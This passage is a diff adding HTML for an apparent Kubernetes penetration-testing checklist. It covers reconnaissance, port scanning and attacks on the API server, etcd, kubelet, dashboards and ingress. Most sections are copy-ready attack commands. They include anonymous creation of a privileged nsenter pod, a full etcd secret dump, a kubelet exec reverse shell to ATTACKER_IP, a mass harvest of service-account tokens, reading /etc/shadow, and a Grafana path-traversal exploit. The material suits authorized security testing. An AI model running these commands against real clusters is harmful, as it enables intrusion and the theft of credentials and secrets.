+<span class="s"># k8s.target.com, api.target.com, kubernetes.target.com</span>
+<span class="s"># argocd.target.com, rancher.target.com, dashboard.target.com</span>
+<span class="s"># grafana.target.com, prometheus.target.com</span>
+<span class="s"># registry.target.com, harbor.target.com</span></pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">GitHub / GitLab Secret Scanning</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">TRUFFLEHOG / GITLEAKS</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Scan public GitHub org for k8s secrets</span>
+trufflehog github --org=target-org --only-verified
+
+<span class="c"># Scan specific repo</span>
+trufflehog git https://github.com/target-org/infra-repo
+
+<span class="c"># Gitleaks on cloned repo</span>
+gitleaks detect --source /path/to/repo --report-path leaks.json
+
+<span class="c"># GitHub Dorks (manual search)</span>
+<span class="s"># org:target-org "kubeconfig"</span>
+<span class="s"># org:target-org "KUBECONFIG"</span>
+<span class="s"># org:target-org "apiVersion: v1" "kind: Config"</span>
+<span class="s"># org:target-org "kubernetes.io/service-account-token"</span>
+<span class="s"># org:target-org filename:kubeconfig</span>
+<span class="s"># org:target-org filename:.kube/config</span></pre>
+        </div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Search DockerHub / container registries</strong> — public images may embed secrets, tokens, or reveal internal architecture via EXPOSE and ENV</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Pastebin / StackOverflow / Gist searches</strong> — leaked kubeconfigs or SA tokens often surface in help requests</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Job postings &amp; LinkedIn</strong> — reveal tech stack (EKS, Calico, Istio, ArgoCD version) for targeted exploit research</div></li>
+        </ul>
+      </div>
+
+      <div class="notes-label">// PASSIVE RECON FINDINGS</div>
+      <textarea class="notes-area" id="notes-s3" placeholder="Paste discovered subdomains, Shodan results, leaked tokens..." oninput="saveNote('s3',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 4: ACTIVE ENUMERATION -->
+  <!-- ============================================================ -->
+  <div class="section" id="s4">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">04</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Active Enumeration &amp; Port Scanning</div>
+        <div class="section-sub">Nmap · Kubernetes Port Fingerprinting · Service Identification</div>
+      </div>
+      <span class="section-badge badge-enum">ENUMERATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Map every relevant port across all in-scope IPs and FQDNs. Kubernetes exposes a distinct set of well-known ports; fingerprinting them reveals the attack surface precisely.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubernetes Port Reference</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>Port</th><th>Service</th><th>Protocol</th><th>Notes</th></tr>
+          <tr><td><code>6443</code></td><td>Kubernetes API Server</td><td>HTTPS</td><td>Primary target — always check</td></tr>
+          <tr><td><code>8080</code></td><td>Kubernetes API Server (insecure)</td><td>HTTP</td><td>Should not be open; critical if found</td></tr>
+          <tr><td><code>2379</code></td><td>etcd client</td><td>HTTPS</td><td>Contains all cluster state + secrets</td></tr>
+          <tr><td><code>2380</code></td><td>etcd peer</td><td>HTTPS</td><td>Node-to-node replication</td></tr>
+          <tr><td><code>10250</code></td><td>Kubelet API</td><td>HTTPS</td><td>Read/exec on pods if exposed</td></tr>
+          <tr><td><code>10255</code></td><td>Kubelet read-only</td><td>HTTP</td><td>Unauthenticated pod/metric listing</td></tr>
+          <tr><td><code>10256</code></td><td>kube-proxy health</td><td>HTTP</td><td>Low-value but fingerprints cluster</td></tr>
+          <tr><td><code>4194</code></td><td>cAdvisor</td><td>HTTP</td><td>Container metrics; deprecated in newer k8s</td></tr>
+          <tr><td><code>30000-32767</code></td><td>NodePort range</td><td>TCP</td><td>Exposed services — enumerate all</td></tr>
+          <tr><td><code>443 / 80</code></td><td>Ingress / Dashboard</td><td>HTTPS/HTTP</td><td>Web apps behind ingress</td></tr>
+          <tr><td><code>9090</code></td><td>Prometheus</td><td>HTTP</td><td>May expose metrics &amp; configs</td></tr>
+          <tr><td><code>3000</code></td><td>Grafana</td><td>HTTP</td><td>Default admin:admin if unpatched</td></tr>
+          <tr><td><code>8001</code></td><td>kubectl proxy</td><td>HTTP</td><td>Critical if left running externally</td></tr>
+        </table>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Nmap Scanning</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">NMAP — K8S FOCUSED</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Full Kubernetes port scan with version detection</span>
+nmap -sV -sC -p 6443,8080,2379,2380,10250,10255,10256,4194,9090,3000,8001 \
+  --script=ssl-cert,http-title,http-auth \
+  -oA k8s_ports TARGET_IP
+
+<span class="c"># NodePort range scan</span>
+nmap -sV -p 30000-32767 --open -T4 TARGET_IP -oA nodeports
+
+<span class="c"># Full TCP scan (slower but complete)</span>
+nmap -sV -sC -p- --min-rate 5000 -T4 TARGET_IP -oA full_tcp
+
+<span class="c"># UDP scan (for DNS sidecar, metrics)</span>
+nmap -sU -p 53,4789 TARGET_IP
+
+<span class="c"># Script: detect unauthenticated k8s API</span>
+nmap -p 6443 --script=ssl-cert,http-title \
+  --script-args="http.useragent=Mozilla" TARGET_IP</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubernetes API Unauthenticated Probing</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">CURL — API ENDPOINT ENUMERATION</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check if API server is reachable and what it returns unauthenticated</span>
+curl -k https://TARGET:6443/
+curl -k https://TARGET:6443/version
+curl -k https://TARGET:6443/api
+curl -k https://TARGET:6443/apis
+
+<span class="c"># Check anonymous access to key endpoints</span>
+curl -k https://TARGET:6443/api/v1/namespaces
+curl -k https://TARGET:6443/api/v1/pods
+curl -k https://TARGET:6443/api/v1/secrets
+
+<span class="c"># Check insecure API server (should return 200 immediately if misconfigured)</span>
+curl http://TARGET:8080/api/v1/namespaces
+
+<span class="c"># Check kubectl proxy exposure</span>
+curl http://TARGET:8001/api/v1/namespaces</pre>
+        </div>
+        <div class="callout danger">
+          <span class="callout-icon">⚡</span>
+          <div><strong>Critical finding:</strong> HTTP 200 on <code>/api/v1/namespaces</code> without a token means anonymous access is enabled. This is an immediate critical — escalate to cluster admin in seconds via <code>kubectl --insecure-skip-tls-verify</code>.</div>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Automated K8s Scanner Tools</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBE-HUNTER (EXTERNAL MODE)</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Run kube-hunter in remote mode against target IP range</span>
+kube-hunter --remote TARGET_IP
+
+<span class="c"># Docker-based run</span>
+docker run -it aquasec/kube-hunter --remote TARGET_IP
+
+<span class="c"># CIDR range scan</span>
+kube-hunter --cidr 10.0.0.0/24
+
+<span class="c"># Output to JSON</span>
+kube-hunter --remote TARGET_IP --report json | tee kube-hunter-report.json</pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// ENUMERATION FINDINGS</div>
+      <textarea class="notes-area" id="notes-s4" placeholder="Open ports, services, API server response details..." oninput="saveNote('s4',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 5: API SERVER ATTACKS -->
+  <!-- ============================================================ -->
+  <div class="section" id="s5">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">05</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Kubernetes API Server Attacks</div>
+        <div class="section-sub">Anonymous Auth · Token Attacks · RBAC Abuse · CVEs</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">The API server is the heart of Kubernetes. Compromising it — whether through anonymous access, stolen tokens, or RBAC misconfigurations — typically means full cluster control.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Anonymous Authentication Abuse</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">ANONYMOUS ACCESS TESTING</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Test anonymous access level</span>
+kubectl --server=https://TARGET:6443 \
+  --insecure-skip-tls-verify=true \
+  --username="" --password="" \
+  auth can-i --list
+
+<span class="c"># If anonymous has pod/exec — immediate shell</span>
+kubectl --server=https://TARGET:6443 \
+  --insecure-skip-tls-verify=true \
+  exec -it &lt;POD&gt; -n &lt;NS&gt; -- /bin/sh
+
+<span class="c"># Create a privileged pod as anonymous (if allowed)</span>
+kubectl --server=https://TARGET:6443 \
+  --insecure-skip-tls-verify=true \
+  run pwned --image=alpine --privileged \
+  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true, \
+  "containers":[{"name":"pwned","image":"alpine","securityContext":{"privileged":true}, \
+  "command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"]}]}}'</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Service Account Token Exploitation</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">TOKEN RECON &amp; PRIVILEGE TESTING</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># From inside a pod — locate SA token</span>
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+<span class="c"># Test token privileges</span>
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://kubernetes.default.svc
+
+curl -sk --header "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces
+
+<span class="c"># Full permission enumeration with token</span>
+kubectl --token=$TOKEN --server=TARGET --insecure-skip-tls-verify \
+  auth can-i --list
+
+<span class="c"># List secrets with token (critical if allowed)</span>
+curl -sk --header "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/secrets</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">RBAC Misconfiguration Enumeration</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">RBAC AUDIT WITH KUBECTL / RAKKESS</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># List all ClusterRoleBindings — find over-privileged accounts</span>
+kubectl get clusterrolebindings -o json | \
+  jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'
+
+<span class="c"># Check what a specific SA can do</span>
+kubectl auth can-i --list --as=system:serviceaccount:NAMESPACE:SA_NAME
+
+<span class="c"># rakkess — full access matrix</span>
+kubectl rakkess
+
+<span class="c"># kubectl-who-can — find who can do dangerous things</span>
+kubectl who-can create pods
+kubectl who-can get secrets
+kubectl who-can create clusterrolebindings
+kubectl who-can exec pods
+
+<span class="c"># Find wildcard permissions (over-privileged roles)</span>
+kubectl get clusterroles -o json | \
+  jq '.items[] | select(.rules[].verbs[]=="*") | .metadata.name'</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Notable API Server CVEs</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>CVE</th><th>Description</th><th>CVSS</th><th>Affected Versions</th></tr>
+          <tr><td><code>CVE-2018-1002105</code></td><td>API server privilege escalation via crafted API request; unauthenticated backend exec</td><td><span class="risk risk-c">9.8</span></td><td>&lt; 1.10.11, &lt; 1.11.5, &lt; 1.12.3</td></tr>
+          <tr><td><code>CVE-2019-11247</code></td><td>RBAC bypass — cluster-scoped resources accessible at namespace-scoped URL</td><td><span class="risk risk-h">8.1</span></td><td>&lt; 1.13.9, &lt; 1.14.5, &lt; 1.15.2</td></tr>
+          <tr><td><code>CVE-2020-8558</code></td><td>Node localhost services reachable via network packets; bypasses local firewall</td><td><span class="risk risk-m">5.4</span></td><td>&lt; 1.18.4, &lt; 1.17.7</td></tr>
+          <tr><td><code>CVE-2021-25741</code></td><td>Symlink exchange in hostPath allows access to host filesystem</td><td><span class="risk risk-h">8.1</span></td><td>&lt; 1.19.14, &lt; 1.20.10, &lt; 1.21.4</td></tr>
+          <tr><td><code>CVE-2022-3294</code></td><td>Node address not validated for proxy requests — SSRF to node services</td><td><span class="risk risk-h">7.6</span></td><td>&lt; 1.25.4, &lt; 1.24.8</td></tr>
+          <tr><td><code>CVE-2023-2728</code></td><td>ServiceAccount token bypass via projected volume — bypasses audience validation</td><td><span class="risk risk-m">6.5</span></td><td>&lt; 1.27.1, &lt; 1.26.4, &lt; 1.25.9</td></tr>
+        </table>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">VERSION CHECK</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Get Kubernetes server version</span>
+curl -k https://TARGET:6443/version
+
+kubectl --server=https://TARGET:6443 --insecure-skip-tls-verify version</pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// API SERVER FINDINGS</div>
+      <textarea class="notes-area" id="notes-s5" placeholder="Auth method, anonymous access result, RBAC findings, CVE applicability..." oninput="saveNote('s5',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 6: ETCD ATTACKS -->
+  <!-- ============================================================ -->
+  <div class="section" id="s6">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">06</span>
+      <div class="section-title-wrap">
+        <div class="section-title">etcd Attacks</div>
+        <div class="section-sub">Unauthenticated Access · Secret Extraction · Credential Harvest</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">etcd stores all cluster state including Secrets in base64 (not encrypted by default). Direct etcd access is equivalent to full cluster compromise — every token, password, and TLS key is readable.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">etcd Unauthenticated Access</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">ETCDCTL — UNAUTHENTICATED DUMP</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Test if etcd is accessible without client cert</span>
+curl http://TARGET:2379/version
+curl http://TARGET:2379/v2/keys/
+
+<span class="c"># etcdctl v3 — unauthenticated (if TLS not enforced)</span>
+etcdctl --endpoints=http://TARGET:2379 endpoint health
+etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only
+
+<span class="c"># Dump all keys — includes all Kubernetes secrets</span>
+etcdctl --endpoints=http://TARGET:2379 get / --prefix
+
+<span class="c"># Dump only Kubernetes secrets</span>
+etcdctl --endpoints=http://TARGET:2379 \
+  get /registry/secrets --prefix --keys-only
+
+<span class="c"># Get a specific secret</span>
+etcdctl --endpoints=http://TARGET:2379 \
+  get /registry/secrets/NAMESPACE/SECRET_NAME | \
+  strings | grep -E "password|token|key|secret"</pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">ETCD WITH CLIENT CERTS (STOLEN)</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># If client certs obtained (e.g., from compromised node)</span>
+etcdctl --endpoints=https://TARGET:2379 \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  get /registry/secrets --prefix --keys-only
+
+<span class="c"># Extract service account signing key</span>
+etcdctl --endpoints=https://TARGET:2379 \
+  --cacert=ca.crt --cert=server.crt --key=server.key \
+  get /registry/secrets/kube-system/ --prefix | strings | grep -A5 "token"</pre>
+        </div>
+      </div>
+
+      <div class="callout danger">
+        <span class="callout-icon">⚡</span>
+        <div><strong>Impact:</strong> Unauthenticated etcd access at <code>:2379</code> allows reading all Kubernetes Secrets, which typically include database credentials, TLS private keys, cloud provider API keys, and service account signing keys. Document and stop — do not exfiltrate production secrets.</div>
+      </div>
+
+      <div class="notes-label">// ETCD FINDINGS</div>
+      <textarea class="notes-area" id="notes-s6" placeholder="etcd exposure details, secrets categories found (do not paste actual secret values)..." oninput="saveNote('s6',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 7: KUBELET ATTACKS -->
+  <!-- ============================================================ -->
+  <div class="section" id="s7">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">07</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Kubelet API Attacks</div>
+        <div class="section-sub">Unauthenticated Exec · Pod Listing · Read-Only API · kubeletctl</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">The Kubelet runs on every worker node and manages pod lifecycle. Misconfigured Kubelets expose an exec API that allows running commands in any pod on that node without Kubernetes RBAC enforcement.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubelet Read-Only API (Port 10255)</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELET READ-ONLY ENUMERATION</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Port 10255 — unauthenticated read-only (should be disabled)</span>
+curl http://NODE_IP:10255/pods
+curl http://NODE_IP:10255/stats/summary
+curl http://NODE_IP:10255/metrics
+curl http://NODE_IP:10255/spec/
+
+<span class="c"># Parse pod listing for interesting containers</span>
+curl -s http://NODE_IP:10255/pods | jq \
+  '.items[] | {name:.metadata.name, ns:.metadata.namespace, \
+  containers:[.spec.containers[].name]}'</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubelet API Exec (Port 10250) — Unauthenticated</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELET EXEC — ANONYMOUS AUTH DISABLED</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check if anonymous auth is enabled on Kubelet</span>
+curl -sk https://NODE_IP:10250/pods
+
+<span class="c"># If pods returned without 401 — exec is possible</span>
+<span class="c"># Get pod details first</span>
+NAMESPACE="default"
+POD_NAME="target-pod"
+CONTAINER="app"
+
+<span class="c"># Execute command via Kubelet API directly (bypasses RBAC)</span>
+curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
+  -d "cmd=id"
+
+<span class="c"># Get reverse shell via Kubelet exec endpoint</span>
+curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
+  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
+
+<span class="c"># Read service account token from any pod on this node</span>
+curl -sk https://NODE_IP:10250/run/$NAMESPACE/$POD_NAME/$CONTAINER \
+  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">kubeletctl — Dedicated Kubelet Attack Tool</div>
+        <div class="callout info">
+          <span class="callout-icon">⚙</span>
+          <div><strong>kubeletctl</strong> (<a href="https://github.com/cyberark/kubeletctl" style="color:var(--accent)">github.com/cyberark/kubeletctl</a>) by CyberArk is purpose-built for Kubelet API interaction — it handles TLS, automates pod/container enumeration, and provides a clean interface for running commands across all pods on a node without needing to craft raw curl requests.</div>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELETCTL — INSTALL</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Linux binary install</span>
+curl -LO https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64
+chmod +x kubeletctl_linux_amd64
+mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
+
+<span class="c"># Verify</span>
+kubeletctl version</pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELETCTL — ENUMERATION</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check server version (also confirms connectivity)</span>
+kubeletctl serverVersion -s NODE_IP
+
+<span class="c"># List all pods on the node</span>
+kubeletctl pods -s NODE_IP
+
+<span class="c"># List pods + containers in a clean table</span>
+kubeletctl pods -s NODE_IP --table
+
+<span class="c"># Scan a CIDR range for exposed Kubelet APIs</span>
+kubeletctl scan --cidr 10.0.0.0/24
+
+<span class="c"># Check which pods allow command execution (RCE scan)</span>
+kubeletctl scan rce -s NODE_IP</pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELETCTL — COMMAND EXECUTION</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Run command in a specific pod/container</span>
+kubeletctl run "id" -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER
+
+<span class="c"># Run command across ALL pods on the node (mass exec)</span>
+kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
+  -s NODE_IP --all-pods
+
+<span class="c"># Interactive shell in a container</span>
+kubeletctl exec "/bin/bash" -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER
+
+<span class="c"># Harvest all SA tokens from every pod on the node</span>
+kubeletctl run "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
+  -s NODE_IP --all-pods 2>/dev/null | \
+  grep -v "^$" | sort -u</pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">KUBELETCTL — LOG &amp; METRIC ACCESS</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Read container logs</span>
+kubeletctl logs -s NODE_IP -n NAMESPACE -p POD_NAME -c CONTAINER
+
+<span class="c"># Access host-level metrics via Kubelet</span>
+kubeletctl metrics -s NODE_IP
+
+<span class="c"># Read host files via a privileged pod (if one exists on node)</span>
+kubeletctl run "cat /host/etc/shadow" \
+  -s NODE_IP -n NAMESPACE -p PRIVILEGED_POD -c CONTAINER
+
+<span class="c"># Port-forward style access to services on the node</span>
+kubeletctl portForward -s NODE_IP -n NAMESPACE -p POD_NAME \
+  --port 8080:8080</pre>
+        </div>
+        <div class="callout danger">
+          <span class="callout-icon">⚡</span>
+          <div><strong>Mass SA token harvest:</strong> <code>kubeletctl --all-pods</code> runs a command across every container on the node simultaneously. On a busy node, this can yield dozens of service account tokens in seconds — test each one for cluster-admin or privileged RBAC bindings.</div>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubelet Authn/Authz Check</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Check <code>--anonymous-auth=false</code></strong> — should be set; if absent, anonymous exec is possible</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Check <code>--authorization-mode=Webhook</code></strong> — if set to AlwaysAllow, any authenticated request is permitted</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Port 10255 accessible</strong> — read-only port should be disabled; flag if reachable from external</div></li>
+        </ul>
+      </div>
+
+      <div class="notes-label">// KUBELET FINDINGS</div>
+      <textarea class="notes-area" id="notes-s7" placeholder="Node IPs tested, anonymous auth status, pods accessible..." oninput="saveNote('s7',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 8: DASHBOARD & UI -->
+  <!-- ============================================================ -->
+  <div class="section" id="s8">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">08</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Dashboard &amp; Management UI Attacks</div>
+        <div class="section-sub">Kubernetes Dashboard · Rancher · Lens · ArgoCD · Grafana</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Management UIs are frequently exposed to reduce operational friction and are a common initial access vector. Many are deployed with default credentials or skip-login enabled.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubernetes Dashboard</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">DASHBOARD ENUMERATION &amp; BYPASS</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check for skip login button (CVE-2018-18264 equivalent)</span>
+curl -k https://TARGET/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
+
+<span class="c"># If skip login is available — click "Skip" in UI for guest token</span>
+<span class="c"># The dashboard may bind to cluster-admin SA in misconfigured deployments</span>
+
+<span class="c"># Check dashboard SA permissions</span>
+kubectl -n kubernetes-dashboard describe sa kubernetes-dashboard
+kubectl -n kubernetes-dashboard get rolebinding,clusterrolebinding \
+  -o json | jq '.items[] | select(.subjects[].name=="kubernetes-dashboard")'
+
+<span class="c"># Check if NodePort exposes dashboard externally</span>
+kubectl get svc -n kubernetes-dashboard</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">ArgoCD Default Credentials &amp; API Abuse</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">ARGOCD ATTACKS</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Default credentials: admin / &lt;initial admin secret&gt;</span>
+<span class="c"># Initial password stored in argocd-initial-admin-secret</span>
+kubectl -n argocd get secret argocd-initial-admin-secret \
+  -o jsonpath="{.data.password}" | base64 -d
+
+<span class="c"># If ArgoCD API is accessible — enumerate apps and repos</span>
+argocd login TARGET --username admin --password PASSWORD --insecure
+argocd app list
+argocd repo list  <span class="c"># May expose Git tokens / deploy keys</span>
+
+<span class="c"># ArgoCD API enumeration via REST</span>
+TOKEN=$(curl -sk https://TARGET/api/v1/session \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"PASSWORD"}' | jq -r .token)
+
+curl -sk https://TARGET/api/v1/applications \
+  -H "Authorization: Bearer $TOKEN" | jq '.'
+
+<span class="c"># CVE-2022-24348: path traversal in app sync (bypass repo restrictions)</span>
+<span class="c"># CVE-2023-22482: OIDC bypass — check if version &lt; 2.5.9 / 2.6.0</span></pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Grafana Default Credentials &amp; CVEs</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">GRAFANA</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Default credentials</span>
+admin:admin
+admin:password
+
+<span class="c"># CVE-2021-43798: Path traversal — read arbitrary files</span>
+curl -k "https://TARGET/public/plugins/alertlist/../../../etc/passwd"
+curl -k "https://TARGET/public/plugins/grafana/../../../etc/grafana/grafana.ini"
+
+<span class="c"># If authenticated — access datasources (may include DB credentials)</span>
+curl -k https://TARGET/api/datasources \
+  -H "Authorization: Basic YWRtaW46YWRtaW4="
+
+<span class="c"># SSRF via datasource — point to internal k8s services</span></pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Other Exposed Management Interfaces</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Rancher</strong> — test default <code>admin</code> / bootstrap password; CVE-2022-21951 (privilege escalation via cluster-level roles)</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Weave Scope</strong> — unauthenticated exec into containers if exposed (port 4040); extremely dangerous</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Prometheus</strong> — enumerate targets, labels, and metric names; may expose internal IP topology and secret values logged as metrics</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Jaeger / Zipkin</strong> — trace data may expose internal service names, authentication headers, and request bodies</div></li>
+        </ul>
+      </div>
+
+      <div class="notes-label">// UI/DASHBOARD FINDINGS</div>
+      <textarea class="notes-area" id="notes-s8" placeholder="Exposed UIs found, auth bypass status, default creds tested..." oninput="saveNote('s8',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 9: INGRESS & EXPOSED SERVICES -->
+  <!-- ============================================================ -->
+  <div class="section" id="s9">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">09</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Ingress &amp; Exposed Service Attacks</div>
+        <div class="section-sub">Ingress Controller CVEs · SSRF · Path Traversal · App Layer</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Ingress controllers are the primary web-facing entry point into a cluster. Vulnerabilities here can lead directly to internal service access, SSRF to the API server, or configuration hijacking.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">NGINX Ingress Controller CVEs</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>CVE</th><th>Description</th><th>CVSS</th><th>Impact</th></tr>
+          <tr><td><code>CVE-2021-25742</code></td><td>Custom snippets allow injecting NGINX config directives — exec or data exfil</td><td><span class="risk risk-h">7.6</span></td><td>Arbitrary NGINX config injection</td></tr>
